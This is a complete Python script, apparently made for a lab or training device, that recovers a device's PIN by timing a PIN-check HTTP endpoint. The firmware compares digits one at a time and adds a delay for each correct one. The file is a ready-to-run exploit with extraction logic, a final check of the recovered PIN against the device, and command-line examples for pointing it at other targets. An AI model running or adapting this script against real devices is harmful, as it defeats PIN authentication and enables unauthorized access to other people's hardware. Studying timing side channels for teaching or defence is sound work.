#!/usr/bin/env python3
"""
Timing Attack on PIN Verification.

Extracts the device PIN digit-by-digit by measuring response time
variations in POST /api/check_pin. The firmware compares the PIN
character-by-character with early exit on mismatch and a 50ms
delay() per correct digit. Each correct digit adds ~50ms to the
response time, clearly visible even with a single sample.

Attack complexity: 10 candidates x N positions x S samples
  vs. brute force: 10^N attempts

Requires: requests (pip install requests)
Optional: pyserial (pip install pyserial) for server-side timing
"""

import argparse
import statistics
import sys
import time

try:
    import requests
except ImportError:
    print("ERROR: requests is required. Install with: pip install requests",
          file=sys.stderr)
    sys.exit(1)


def measure_pin_timing(base_url, pin, samples):
    """Send a PIN and return the median response time in milliseconds.

    Uses a persistent session for consistent TCP connection reuse,
    which reduces connection-setup jitter between measurements.
    """
    times = []
    session = requests.Session()
    for _ in range(samples):
        start = time.time()
        try:
            r = session.post(f"{base_url}/api/check_pin",
                             data={"pin": pin}, timeout=10)
        except requests.RequestException:
            continue
        elapsed = (time.time() - start) * 1000.0
        times.append(elapsed)
    session.close()

    if not times:
        return None, None
    return statistics.median(times), times


def extract_pin(base_url, pin_length, samples, known_prefix="", verbose=True):
    """Extract the PIN digit-by-digit using timing measurements.

    For each position, measures all 10 candidates and picks the one with
    the highest median response time. Uses a persistent HTTP session to
    reduce connection-setup variance between digits.
    """
    known = known_prefix

    if verbose:
        print("=" * 60)
        print("TIMING ATTACK - Extracting PIN digit by digit")
        print("=" * 60)
        print(f"Target:     {base_url}/api/check_pin")
        print(f"PIN length: {pin_length}")
        print(f"Base samples: {samples} (scales up for later positions)")
        if known:
            print(f"Starting from known prefix: '{known}'")
        print()

    for pos in range(len(known), pin_length):
        # Scale samples with position: later digits need more samples
        # because WiFi jitter grows relative to the fixed 50ms signal
        pos_samples = samples + pos * samples
        if verbose:
            print(f"--- Position {pos + 1} of {pin_length} ({pos_samples} samples) ---")
            print(f"Known so far: '{known}'")

        timings = {}
        for digit in range(10):
            test_pin = known + str(digit) + "0" * (pin_length - pos - 1)
            median_time, raw_times = measure_pin_timing(base_url, test_pin, pos_samples)

            if median_time is None:
                if verbose:
                    print(f"  PIN {test_pin}: ERROR (no successful requests)")
                continue

            timings[digit] = median_time
            if verbose:
                print(f"  PIN {test_pin}: {median_time:.3f}ms "
                      f"(median of {len(raw_times)})")

        if not timings:
            print(f"[-] No timing data for position {pos + 1}. Aborting.")
            return known

        # The correct digit has the longest median response time
        ranked = sorted(timings.items(), key=lambda x: x[1], reverse=True)
        correct = ranked[0][0]
        best_time = ranked[0][1]
        second_time = ranked[1][1] if len(ranked) > 1 else best_time
        others_median = statistics.median([t for _, t in ranked[1:]]) if len(ranked) > 1 else best_time
        delta = best_time - others_median
        gap = best_time - second_time
        known += str(correct)

        if verbose:
            conf = "HIGH" if gap > 0.3 else "MEDIUM" if gap > 0.1 else "LOW"
            print(f"  >> Digit {pos + 1} = {correct} "
                  f"(delta: {delta:.3f}ms, gap over 2nd: {gap:.3f}ms, "
                  f"confidence: {conf})")
            if conf == "LOW":
                print(f"     WARNING: Low confidence - try increasing --samples.")
            print()

    return known


def verify_pin(base_url, pin):
    """Verify the extracted PIN against the device."""
    try:
        r = requests.post(f"{base_url}/api/check_pin",
                          data={"pin": pin}, timeout=10)
        return r.text.strip()
    except requests.RequestException as e:
        return f"ERROR: {e}"


def setup_serial_monitor(port, baud):
    """Open a serial connection for monitoring server-side timing logs."""
    try:
        import serial
    except ImportError:
        print("WARNING: pyserial not installed. Serial monitoring disabled.",
              file=sys.stderr)
        return None

    try:
        ser = serial.Serial(port, baud, timeout=0.1)
        return ser
    except Exception as e:
        print(f"WARNING: Could not open {port}: {e}", file=sys.stderr)
        return None


def read_serial_timing(ser):
    """Read and display any PINCHK timing lines from serial."""
    if ser is None:
        return

    try:
        data = ser.read(ser.in_waiting)
        if data:
            text = data.decode("utf-8", errors="replace")
            for line in text.strip().splitlines():
                if "[PINCHK]" in line:
                    print(f"  [serial] {line.strip()}")
    except Exception:
        pass


def main():
    parser = argparse.ArgumentParser(
        description="Timing attack on PIN verification - extract the device "
                    "PIN digit-by-digit by measuring /api/check_pin response "
                    "times. Each correct digit adds ~50ms server-side delay.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s
      Extract a 6-digit PIN using 10 samples per candidate

  %(prog)s --samples 20
      Use 20 samples for higher accuracy on noisy networks

  %(prog)s --known-prefix 12
      Start from known first two digits (skip positions 1-2)

  %(prog)s --pin-length 4 --samples 30
      Extract a 4-digit PIN with 30 samples

  %(prog)s --serial-port /dev/ttyACM0
      Also capture server-side timing from the serial console
      (shows exact microsecond elapsed time from [PINCHK] log)

  %(prog)s --target http://10.0.0.1 --pin-length 8 --samples 40
      Attack a device at a different IP with an 8-digit PIN

How it works:
  The firmware compares the submitted PIN character-by-character:
    - First wrong digit: immediate break (~14ms baseline)
    - Each correct digit: +50ms delay
    - All correct: returns "OK" (~314ms for 6-digit PIN)

  Each correct digit adds ~50ms - clearly visible in a single
  HTTP request. The correct digit at each position stands out
  dramatically (4-5x longer than wrong digits).

  Attack cost: 10 x 6 x 10 = 600 requests (vs 1,000,000 brute force)
""")
    parser.add_argument("--target", "-t", default="http://192.168.4.1",
                        help="Device base URL (default: http://192.168.4.1)")
    parser.add_argument("--pin-length", "-l", type=int, default=6,
                        help="Expected PIN length (default: 6)")
    parser.add_argument("--samples", "-s", type=int, default=10,
                        help="Number of timing samples per candidate digit "
                             "(default: 10)")
    parser.add_argument("--known-prefix", "-k", default="",
                        help="Known PIN prefix to skip already-extracted "
                             "digits (default: empty)")
    parser.add_argument("--serial-port", default=None,
                        help="Serial port for server-side timing capture "
                             "(optional, e.g., /dev/ttyACM0)")

    args = parser.parse_args()

    # Validate known prefix
    if args.known_prefix:
        if not args.known_prefix.isdigit():
            print("ERROR: --known-prefix must contain only digits.", file=sys.stderr)
            sys.exit(1)
        if len(args.known_prefix) >= args.pin_length:
            print("ERROR: --known-prefix is already the full PIN length.",
                  file=sys.stderr)
            sys.exit(1)

    # Set up serial monitor if requested
    ser = None
    if args.serial_port:
        print(f"[*] Opening serial monitor on {args.serial_port}...")
        ser = setup_serial_monitor(args.serial_port, 115200)
        if ser:
            print(f"    Serial monitor active. Server-side [PINCHK] logs will "
                  f"be displayed.")
        print()

    # Run the timing attack
    extracted_pin = extract_pin(
        args.target,
        args.pin_length,
        args.samples,
        args.known_prefix
    )

    # Check serial for any remaining output
    if ser:
        time.sleep(0.5)
        read_serial_timing(ser)
        ser.close()

    # Verify the result
    print("=" * 60)
    print(f"EXTRACTED PIN: {extracted_pin}")
    print("=" * 60)
    print()

    print("[*] Verifying extracted PIN against the device...")
    result = verify_pin(args.target, extracted_pin)
    print(f"    PIN: {extracted_pin}")
    print(f"    Response: {result}")
    print()

    if result == "OK":
        total_requests = 10 * args.pin_length * args.samples
        brute_force = 10 ** args.pin_length
        print(f"[+] PIN verified successfully.")
        print(f"[+] Attack cost: ~{total_requests} requests "
              f"(vs {brute_force:,} brute force)")
    else:
        print("[-] PIN verification failed. Try increasing --samples for "
              "better accuracy,")
        print("    or use --serial-port to monitor server-side timing for "
              "precise measurements.")


if __name__ == "__main__":
    main()
